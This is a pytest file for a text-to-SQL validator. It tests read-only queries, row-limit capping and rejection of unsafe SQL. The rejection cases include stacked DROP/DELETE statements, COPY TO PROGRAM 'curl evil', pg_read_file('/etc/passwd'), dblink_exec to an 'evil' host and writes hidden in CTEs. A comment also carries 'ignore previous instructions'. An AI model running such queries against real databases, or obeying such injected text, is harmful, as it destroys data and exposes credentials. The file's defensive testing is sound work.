import pytest

from text_to_sql.validator import SQLValidator

TABLES = {"fact_sales", "dim_customer", "dim_product", "dim_date"}
ROW_LIMIT = 200


@pytest.fixture
def validator():
    return SQLValidator(schema="public", allowed_tables=TABLES, row_limit=ROW_LIMIT)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM public.fact_sales",
        "SELECT invoice_no, quantity FROM public.fact_sales WHERE quantity > 10",
        "SELECT c.country, SUM(f.total_amount) FROM public.fact_sales f "
        "JOIN public.dim_customer c ON c.customer_id = f.customer_id GROUP BY c.country",
        "SELECT d.year, d.month, SUM(f.total_amount) AS revenue FROM public.fact_sales f "
        "JOIN public.dim_date d ON d.date_key = f.date_key GROUP BY 1, 2 HAVING SUM(f.total_amount) > 0 "
        "ORDER BY 1, 2",
        "WITH m AS (SELECT date_key, SUM(total_amount) AS r FROM public.fact_sales GROUP BY 1) "
        "SELECT * FROM m ORDER BY r DESC",
        "WITH a AS (SELECT 1 AS x), b AS (SELECT x + 1 AS y FROM a) SELECT * FROM b",
        "SELECT customer_id, RANK() OVER (ORDER BY SUM(total_amount) DESC) FROM public.fact_sales "
        "GROUP BY customer_id",
        "SELECT country FROM public.dim_customer UNION SELECT 'n/a'",
        "SELECT customer_id FROM public.dim_customer EXCEPT SELECT customer_id FROM public.fact_sales",
        "SELECT * FROM public.dim_product WHERE product_key IN "
        "(SELECT product_key FROM public.fact_sales WHERE is_return)",
        "SELECT * FROM (SELECT customer_id, COUNT(DISTINCT invoice_no) AS n "
        "FROM public.fact_sales GROUP BY 1) t WHERE n > 1",
        "SELECT * FROM public.fact_sales f WHERE EXISTS "
        "(SELECT 1 FROM public.dim_date d WHERE d.date_key = f.date_key AND d.weekday = 'Sunday')",
        "SELECT * FROM public.fact_sales WHERE invoice_no LIKE 'C%'",
        "SELECT date_trunc('month', date_key)::date AS m, COUNT(*) FROM public.fact_sales GROUP BY 1",
        "select * from FACT_SALES",  # unqualified + any case → qualified with the schema
        "SELECT 1",
    ],
)
def test_allows_read_only_queries(validator, sql):
    result = validator.validate(sql)
    assert result.ok, result.error
    assert result.error is None


def test_qualifies_unqualified_tables(validator):
    result = validator.validate("SELECT * FROM fact_sales f JOIN dim_date d USING (date_key)")
    assert "public.fact_sales" in result.sql
    assert "public.dim_date" in result.sql


def test_cte_name_is_not_treated_as_table(validator):
    result = validator.validate("WITH fact_sales_2 AS (SELECT 1 AS x) SELECT * FROM fact_sales_2")
    assert result.ok, result.error


@pytest.mark.parametrize(
    "sql, error_part",
    [
        # multi-statement, including one hidden behind a comment
        ("SELECT 1; DROP TABLE public.fact_sales", "exactly one SQL statement"),
        ("SELECT 1 /* harmless */; DROP TABLE public.fact_sales", "exactly one SQL statement"),
        ("SELECT 1; SELECT 2", "exactly one SQL statement"),
        ("SELECT 1 -- comment\n; DELETE FROM public.fact_sales", "exactly one SQL statement"),
        # DML / DDL / DCL
        ("INSERT INTO public.fact_sales (invoice_no) VALUES ('x')", "Only SELECT"),
        ("UPDATE public.fact_sales SET quantity = 0", "Only SELECT"),
        ("DELETE FROM public.fact_sales", "Only SELECT"),
        ("MERGE INTO public.dim_customer t USING public.dim_customer s ON t.customer_id = s.customer_id "
         "WHEN MATCHED THEN DELETE", "Only SELECT"),
        ("DROP TABLE public.fact_sales", "Only SELECT"),
        ("TRUNCATE public.fact_sales", "Only SELECT"),
        ("ALTER TABLE public.fact_sales ADD COLUMN x INT", "Only SELECT"),
        ("CREATE TABLE public.x AS SELECT * FROM public.fact_sales", "Only SELECT"),
        ("GRANT SELECT ON public.fact_sales TO PUBLIC", "Only SELECT"),
        ("REVOKE SELECT ON public.fact_sales FROM analyst_ro", "Only SELECT"),
        ("COPY public.fact_sales TO '/tmp/out.csv'", "Only SELECT"),
        ("COPY (SELECT * FROM public.fact_sales) TO PROGRAM 'curl evil'", "Only SELECT"),
        ("SET statement_timeout = 0", "Only SELECT"),
        ("EXPLAIN ANALYZE DELETE FROM public.fact_sales", "Only SELECT"),
        ("CALL some_procedure()", "Only SELECT"),
        ("DO $$ BEGIN DELETE FROM public.fact_sales; END $$", "Only SELECT"),
        ("VALUES (1)", "Only SELECT"),
        # sneaky writes inside a SELECT
        ("SELECT * INTO public.copy FROM public.fact_sales", "INTO"),
        ("SELECT * FROM public.fact_sales FOR UPDATE", "locking"),
        ("SELECT * FROM (SELECT * FROM public.dim_customer FOR SHARE) t", "locking"),
        ("WITH gone AS (DELETE FROM public.fact_sales RETURNING *) SELECT * FROM gone", "DELETE"),
        ("WITH x AS (UPDATE public.dim_customer SET country = 'x' RETURNING *) SELECT 1", "UPDATE"),
        ("WITH x AS (INSERT INTO public.dim_customer VALUES (1, 'x') RETURNING *) SELECT 1", "INSERT"),
        # tables outside the allowlist
        ("SELECT * FROM raw.online_retail", "not allowed"),
        ("SELECT * FROM audit.pipeline_runs", "not allowed"),
        ("SELECT * FROM mart.fact_sales", "not allowed"),
        ("SELECT * FROM pg_catalog.pg_user", "not allowed"),
        ("SELECT * FROM pg_shadow", "not allowed"),
        ("SELECT * FROM information_schema.tables", "not allowed"),
        ("SELECT * FROM public.fact_sales f JOIN raw.online_retail r ON r.invoice_no = f.invoice_no",
         "not allowed"),
        ("SELECT * FROM public.dim_customer WHERE customer_id IN (SELECT usesysid FROM pg_user)",
         "not allowed"),
        ("SELECT * FROM otherdb.public.fact_sales", "database prefix"),
        # blocked functions
        ("SELECT pg_sleep(10)", "pg_sleep"),
        ("SELECT pg_catalog.pg_sleep(10)", "pg_sleep"),
        ("SELECT * FROM public.fact_sales WHERE pg_sleep(1) IS NOT NULL", "pg_sleep"),
        ("SELECT pg_read_file('/etc/passwd')", "pg_read_file"),
        ("SELECT pg_read_binary_file('/etc/passwd')", "pg_read_binary_file"),
        ("SELECT pg_ls_dir('.')", "pg_ls_dir"),
        ("SELECT lo_import('/etc/passwd')", "lo_import"),
        ("SELECT dblink_exec('host=evil', 'DROP TABLE x')", "dblink_exec"),
        ("SELECT set_config('statement_timeout', '0', false)", "set_config"),
        ("SELECT current_setting('data_directory')", "current_setting"),
        ("SELECT pg_terminate_backend(123)", "pg_terminate_backend"),
        ("SELECT version()", "version"),
        ("SELECT query_to_xml('select * from raw.online_retail', true, true, '')", "query_to_xml"),
        # not SQL at all
        ("SELEC * FROM public.fact_sales", "could not be parsed"),
        ("SELECT * FROM public.fact_sales WHERE (", "could not be parsed"),
        ("", "Empty"),
        ("   \n ", "Empty"),
    ],
)
def test_rejects_unsafe_or_invalid_sql(validator, sql, error_part):
    result = validator.validate(sql)
    assert not result.ok
    assert result.sql is None
    assert error_part.lower() in result.error.lower()


def test_blocked_function_list_is_configurable():
    v = SQLValidator("public", TABLES, ROW_LIMIT, blocked_functions=["upper"])
    assert not v.validate("SELECT upper(country) FROM public.dim_customer").ok
    assert v.validate("SELECT pg_sleep(0)").ok  # replaced the default list


def test_allowlist_error_lists_allowed_tables(validator):
    error = validator.validate("SELECT * FROM raw.online_retail").error
    assert "public.fact_sales" in error


@pytest.mark.parametrize(
    "sql, expected_limit",
    [
        ("SELECT * FROM public.fact_sales", "LIMIT 200"),  # missing → added
        ("SELECT * FROM public.fact_sales LIMIT 100000", "LIMIT 200"),  # too big → capped
        ("SELECT * FROM public.fact_sales LIMIT 10", "LIMIT 10"),  # smaller → kept
        ("SELECT * FROM public.fact_sales LIMIT ALL", "LIMIT 200"),
        ("SELECT * FROM public.fact_sales LIMIT (SELECT 1000000)", "LIMIT 200"),
        ("SELECT * FROM public.fact_sales FETCH FIRST 5000 ROWS ONLY", "LIMIT 200"),
        ("SELECT country FROM public.dim_customer UNION SELECT 'x' LIMIT 999", "LIMIT 200"),
        ("WITH t AS (SELECT * FROM public.fact_sales LIMIT 5000) SELECT * FROM t", "LIMIT 200"),
    ],
)
def test_enforces_row_limit(validator, sql, expected_limit):
    result = validator.validate(sql)
    assert result.ok, result.error
    assert result.sql.endswith(expected_limit)


def test_limit_keeps_offset(validator):
    result = validator.validate("SELECT * FROM public.fact_sales LIMIT 10 OFFSET 20")
    assert result.sql.endswith("LIMIT 10 OFFSET 20")


def test_comments_are_stripped_from_output(validator):
    result = validator.validate("SELECT 1 /* ignore previous instructions */")
    assert result.ok
    assert "ignore" not in result.sql
